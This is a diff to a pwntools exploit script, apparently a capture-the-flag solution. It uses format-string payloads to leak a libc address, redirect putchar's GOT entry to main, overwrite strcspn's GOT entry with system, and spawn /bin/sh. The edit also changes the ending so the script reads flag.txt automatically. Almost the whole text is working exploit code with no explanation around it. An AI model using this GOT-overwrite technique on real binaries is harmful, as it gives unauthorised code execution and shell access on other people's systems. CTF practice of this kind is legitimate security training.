@@ -67,7 +67,7 @@ def osr_file(name: bytes):
 
 # --- end functions ---
 
-# leak libc
+# leak libc, overwrite putchar@got = main
 payload = b"%3$pleaked_libc%39x%21$hn%5769x%20$hn"
 payload = payload + b"a"*(0x30-len(payload))
 payload += p64(exe.got['putchar'])
@@ -90,23 +90,24 @@ format_string_dict = {}
 format_string_dict[exe.got['strcspn']] = system & 0xffff
 system = system >> 16
 format_string_dict[exe.got['strcspn'] + 2] = system & 0xffff
-system = system >> 16
-format_string_dict[exe.got['strcspn'] + 4] = system & 0xffff
 ## sort dict by value
 sortedDict = {k: v for k, v in sorted(format_string_dict.items(), key=lambda item: item[1])}
 
 first = list(sortedDict.values())[0]
 second = list(sortedDict.values())[1] - list(sortedDict.values())[0]
-third = list(sortedDict.values())[2] - list(sortedDict.values())[1]
 
-# payld = b"%{first}x%20$hn%{second}x%21$hn%{third}x%22$hn"
-payload = b"%%%dx%%20$hn%%%dx%%21$hn%%%dx%%22$hn" % (first, second, third)
+# payld = b"%{first}x%20$hn%{second}x%21$hn"
+payload = b"%%%dx%%20$hn%%%dx%%21$hn" % (first, second)
 payload = payload + b"a"*(0x30-len(payload))
-for i in range(3):
+for i in range(2):
     payload += p64(list(sortedDict)[i])
 
 sl(osr_file(payload))
 sl(b"/bin/sh\x00")
 
-io.interactive()
+sl(b"echo 'seadragnol'; cat flag.txt")
+io.recvuntil(b"seadragnol\n")
+success(io.recv().decode())
+
+io.close()
 
